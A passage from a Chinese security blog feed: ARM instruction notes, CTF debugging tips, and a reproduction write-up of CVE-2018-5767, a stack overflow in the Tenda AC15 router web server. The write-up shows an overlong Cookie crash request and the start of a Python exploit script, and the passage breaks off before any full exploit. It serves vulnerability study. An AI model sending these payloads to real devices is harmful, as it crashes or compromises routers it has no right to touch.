title="ASR、LSR、LSL、ROR、RRX、Type Rs——移位指令"></a>ASR、LSR、LSL、ROR、RRX、Type Rs——移位指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ASR #n：算术右移n位</span><br><span class="line">LSL #n：逻辑左移n位</span><br><span class="line">LSR #n：逻辑右移n位</span><br><span class="line">ROR #n：循环右移n位</span><br><span class="line">RRX：带扩展的循环右移1位</span><br><span class="line">Type Rs：Type为移位的一种类型，Rs为偏移量寄存器，低8位有效</span><br></pre></td></tr></table></figure><h3 id="CMP——比较指令；EQ、NE、CE等——指令的条件域"><a href="#CMP——比较指令；EQ、NE、CE等——指令的条件域" class="headerlink" title="CMP——比较指令；EQ、NE、CE等——指令的条件域"></a>CMP——比较指令；EQ、NE、CE等——指令的条件域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CMP R2, R3</span><br><span class="line"></span><br><span class="line">BEQ loc_8410; R2==R3</span><br><span class="line">BNE loc_8410; R2!=R3</span><br><span class="line">BCS loc_8410; R2&gt;=R3无符号</span><br><span class="line">BCC loc_8410; R2&lt;R3无符号</span><br><span class="line">BMI loc_8410; 负数</span><br><span class="line">BPL loc_8410; 正数或0</span><br><span class="line">BVS loc_8410; 溢出</span><br><span class="line">BVC loc_8410; 未溢出</span><br><span class="line">BHI loc_8410; R2&gt;R3无符号</span><br><span class="line">BLS loc_8410; R2&lt;=R3无符号</span><br><span class="line">BGE loc_8410; R2&gt;=R3带符号</span><br><span class="line">BLT loc_8410; R2&lt;R3带符号</span><br><span class="line">BGT loc_8410; R2&gt;R3带符号</span><br><span class="line">BLE loc_8410; R2&lt;=R3带符号</span><br><span class="line">BAL loc_8410; 无条件</span><br></pre></td></tr></table></figure><h3 id="AND、ORR、BIC——逻辑运算命令"><a href="#AND、ORR、BIC——逻辑运算命令" class="headerlink" title="AND、ORR、BIC——逻辑运算命令"></a>AND、ORR、BIC——逻辑运算命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">按位与：</span><br><span class="line">AND Rd, Rn; Rd &amp;= Rn</span><br><span class="line">AND.W Rd, Rn, #imm12; Rd = Rn &amp; imm12</span><br><span class="line">AND.W Rd, Rm, Rn; Rd = Rm &amp; Rn</span><br><span class="line">按位或：</span><br><span class="line">ORR Rd, Rn; Rd |= Rn</span><br><span class="line">ORR.W Rd, Rn, #imm12; Rd = Rn | imm12</span><br><span class="line">ORR.W Rd, Rm, Rn; Rd = Rm | Rn</span><br><span class="line">按位清零：</span><br><span class="line">BIC Rd, Rn; Rd &amp;= ~Rn</span><br><span class="line">BIC.W Rd, Rn, #imm12; Rd = Rn &amp; ~imm12</span><br><span class="line">BIC.W Rd, Rm, Rn; Rd = Rm &amp; ~Rn</span><br><span class="line">按位或反：</span><br><span class="line">ORN.W Rd, Rn, #imm12; Rd = Rn | ~imm12</span><br><span class="line">ORN.W Rd, Rm, Rn; Rd = Rm | ~Rn</span><br><span class="line">按位异或：</span><br><span class="line">EOR Rd, Rn; Rd ^= Rn</span><br><span class="line">EOR.W Rd, Rn, #imm12; Rd = Rn ^ imm12</span><br><span class="line">EOR.W Rd, Rm, Rn; Rd = Rm ^ Rn</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;进行一个arm架构的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>技巧总结</title>
    <link href="http://example.com/2023/02/01/tricks/"/>
    <id>http://example.com/2023/02/01/tricks/</id>
    <published>2023-02-01T14:26:10.000Z</published>
    <updated>2023-02-01T14:36:53.351Z</updated>
    
    <content type="html"><![CDATA[<p>总结一些常用的技巧。</p><span id="more"></span><h2 id="patchelf——替换文件的libc和ld"><a href="#patchelf——替换文件的libc和ld" class="headerlink" title="patchelf——替换文件的libc和ld"></a>patchelf——替换文件的libc和ld</h2><p>如果出题方没有提供<code>libc</code>和<code>ld</code>，请看技巧<code>glibc-all-in-one——查找libc/ld/.debug</code>：</p><p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185193/37/30162/4434/63c7ad55F0660ee0e/1543736411453741.png"></p><p>更换前：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/177648/14/31676/38386/63c7ad56Ff8f96af0/34a9c8de00276d1e.png" style="zoom:80%;" /><p>装载命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新ld和libc均使用绝对路径</span></span><br><span class="line"><span class="comment"># 更换ld</span></span><br><span class="line"><span class="comment"># patchelf --set-interpreter /path/to/ld.so /path/to/binary</span></span><br><span class="line">patchelf --set-interpreter /home/anza/hgame/spfa/ld-2.31.so ./spfa</span><br><span class="line"><span class="comment"># 更换libc</span></span><br><span class="line"><span class="comment"># patchelf --replace-needed originlibc newlibc /path/to/binary</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/anza/hgame/spfa/libc-2.31.so ./spfa</span><br></pre></td></tr></table></figure><p>更换后：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/4230/21/20981/40404/63c7ad56F2f43d7dd/a51d37282b0c94d1.png" style="zoom:80%;" /><h2 id="glibc-all-in-one——查找libc-ld-debug"><a href="#glibc-all-in-one——查找libc-ld-debug" class="headerlink" title="glibc-all-in-one——查找libc/ld/.debug"></a>glibc-all-in-one——查找libc/ld/.debug</h2><p><code>patchelf</code>修改了<code>libc</code>和<code>ld</code>，而<code>gdb</code>调试时会去寻找<code>libc</code>目录下的<code>.debug</code>文件，所以无法使用一些<code>heap/bins</code>之类的命令，因此我们去<code>glibc-all-in-one</code>中下载对应版本的<code>libc</code>及其附带的<code>.debug</code>。</p><p>实现操作如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>在该目录下<code>ctrl+h</code>便能显示出隐藏文件<code>.debug</code>，将<code>.debug</code>复制到题目的目录下，<code>gdb</code>调试命令就恢复了。</p><h2 id="关闭Alarm"><a href="#关闭Alarm" class="headerlink" title="关闭Alarm"></a>关闭Alarm</h2><p>命令行关闭法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./vuln</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">关于不同版本 glibc 更换的一些问题</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;总结一些常用的技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="tricks" scheme="http://example.com/categories/ctf/tricks/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-5767复现</title>
    <link href="http://example.com/2023/01/18/CVE-2018-5767/"/>
    <id>http://example.com/2023/01/18/CVE-2018-5767/</id>
    <published>2023-01-18T12:29:07.000Z</published>
    <updated>2023-01-23T02:01:33.846Z</updated>
    
    <content type="html"><![CDATA[<p>考研期间想复现的漏洞，现在挖出来盘一下。</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q">Tenda-AC15栈溢出漏洞(CVE-2018-5767)    by 星期五实验室</a></p><p><a href="https://zhuanlan.zhihu.com/p/468018356">cve-2018-5767 路由器栈溢出漏洞复现    by 合天网安实验室</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">CVE-2018-5767 复现分析    by CataLpa</a></p></blockquote><span id="more"></span><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 20.04</span><br><span class="line">IDA7.7</span><br><span class="line">GDB调试器</span><br><span class="line">Binwalk固件解包工具</span><br><span class="line">路由器固件：Tenda AC15 15.03.1.16_multi</span><br></pre></td></tr></table></figure><p><a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">Tenda AC15 15.03.1.16_multi下载地址</a></p><p><a href="https://www.cnblogs.com/deerCode/p/12153248.html">sasquatch报错问题解决</a></p><h3 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h3><ul><li><p>分离固件系统<code>binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin</code>，得到扫描信息。</p></li><li><p>切换到<code>./~.extracted/squashfs-root</code>，可以看到提取出的文件系统目录：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  etc_ro  home  init  lib  mnt  proc  root  sbin  sys  tmp  usr  var  webroot  webroot_ro</span><br></pre></td></tr></table></figure><ul><li>在<code>/bin</code>下看到了<code>busybox</code>文件，依稀记得哪年国赛有见到过，<code>busybox</code>是一个集成了一百多个常用Linux命令和工具的软件，在<code>嵌入式Linux</code>应用中，<code>busybox</code>应用非常广泛，同时大多数<code>Linux发行版</code>的安装程序中都含有<code>busybox</code>。我们查看一下其文件头信息：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ readelf -h busybox </span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              EXEC (可执行文件)</span><br><span class="line">  系统架构:                          ARM</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0xbeec</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          366736 (bytes into file)</span><br><span class="line">  标志：             0x5000002, Version5 EABI, &lt;unknown&gt;</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         7</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         24</span><br><span class="line">  Section header string table index: 23</span><br></pre></td></tr></table></figure><ul><li>我们采用<code>qemu</code>配合<code>chroot</code>来启动<code>/bin/httpd</code>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-arm-static .</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>启动后发现程序一直卡在<code> Welcome to ...</code>：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55814/9/22768/36236/63cb76a8F332e8710/76022a7a1563947d.png" style="zoom:80%;" /><ul><li>查看源程序，发现有两个检查，在<code>qemu</code>模拟环境下连接不到相关服务，因此<code>patch</code>掉：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/183742/15/31846/41397/63cb7716F4dcc06a7/efbc58270829d983.png" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_network：检查网络</span><br><span class="line">ConnectCfm：连接某种服务</span><br></pre></td></tr></table></figure><ul><li>启动修改后的<code>httpd</code>，出现了新问题，<code>ip</code>地址不是本地的：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107512/5/34170/71762/63cb9cccF4863cd3a/252f16a530ff8205.png" style="zoom:80%;" /><ul><li>由此需要自行配置网桥<code>br0</code>后重新执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/199991/3/31226/69926/63cba043Fc231d974/68a8d252030e3f18.png" style="zoom:80%;" /><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul><li>漏洞位于<code>R7WebsSecurityHandler</code>中：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/96405/27/36314/97172/63cba273Ff4595e2e/91d078e546898fe2.png" style="zoom:80%;" /><ul><li>先来看看<code>sscanf</code>的用法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(<span class="string">&quot;zhou456 hedf&quot;</span>, <span class="string">&quot;%[^ ]&quot;</span>, str); <span class="comment">//取到指定字符为止的字符串,取遇到空格为止字符串    </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;str=%s\n&quot;</span>, str);  <span class="comment">//str=zhou456;</span></span><br></pre></td></tr></table></figure><p>即将源字符串以一定形式(正则)读入到目的字符串。</p><ul><li><code>password</code>是用户可控的，它是<code>http</code>请求中<code>cookie</code>上的一个字段，也是伪代码中的<code>v40</code>，而<code>v33</code>数组只有<code>128</code>大小，<code>sscanf(v40, &quot;%*[^=]=%[^;];*&quot;, v33);</code>存在栈溢出漏洞。</li><li>我们检查下保护机制，除了栈不可执行，其他保护均未开启，容易想到<code>ROP</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li>首先我们要进入漏洞函数，只需访问如<code>/goform/anza</code>即可绕过判断。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/203214/22/30645/24831/63cba72aFf1c6c343/6015d1ce1354bafa.png" alt="img" style="zoom:80%;" /><ul><li>访问<code>http://&lt; ip &gt;/goform/anza</code>，用火狐配合<code>burpsuite</code>抓个包：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>增加<code>Cookie</code>字段送过去，尝试使进程崩溃：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>查看服务端，发现程序出现了段错误：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/179852/7/31724/77375/63cba99fF355a5dc6/221b8aa6cd6408c2.png" style="zoom:80%;" /><ul><li>使用<code>gdb-multiarch</code>调试程序，在此之前现在固定端口打开程序：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>另开一个窗口进行调试：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0xfffef87b ◂— stmdbvs r2!, &#123;r1, r2, r3, r5, r8, sb, sl, fp, sp&#125; ^ /* 0x69622f2e; &#x27;./bin/httpd&#x27; */</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0xd2000 —▸ 0xe520 ◂— push   &#123;r3, lr&#125; /* 0xe92d4008 */</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0xfffef770 ◂— 1</span><br><span class="line"> PC   0xff7e1930 (_start) ◂— mov    r0, sp /* 0xe1a0000d; &#x27;\r&#x27; */</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0xff7e1930 &lt;_start&gt;       mov    r0, sp</span><br><span class="line">   0xff7e1934 &lt;_start+4&gt;     bl     #0xff7e4bb4                   &lt;0xff7e4bb4&gt;</span><br><span class="line"> </span><br><span class="line">   0xff7e1938 &lt;_start+8&gt;     mov    r6, r0</span><br><span class="line">   0xff7e193c &lt;_start+12&gt;    ldr    sl, [pc, #0x30]</span><br><span class="line">   0xff7e1940 &lt;_start+16&gt;    add    sl, pc, sl</span><br><span class="line">   0xff7e1944 &lt;_start+20&gt;    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0xff7e1948 &lt;_start+24&gt;    ldr    r4, [sl, r4]</span><br><span class="line">   0xff7e194c &lt;_start+28&gt;    ldr    r1, [sp]</span><br><span class="line">   0xff7e1950 &lt;_start+32&gt;    sub    r1, r1, r4</span><br><span class="line">   0xff7e1954 &lt;_start+36&gt;    add    sp, sp, r4, lsl #2</span><br><span class="line">   0xff7e1958 &lt;_start+40&gt;    add    r2, sp, #4</span><br></pre></td></tr></table></figure><ul><li>断点下在<code>End of function R7WebsSecurityHandler</code>即执行如下命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x002ED18</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><ul><li>而后再打开一个窗口，我们用<code>python</code>的<code>request库</code>将数据传过去：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>&#125;</span><br><span class="line">requests.get(url=URL, 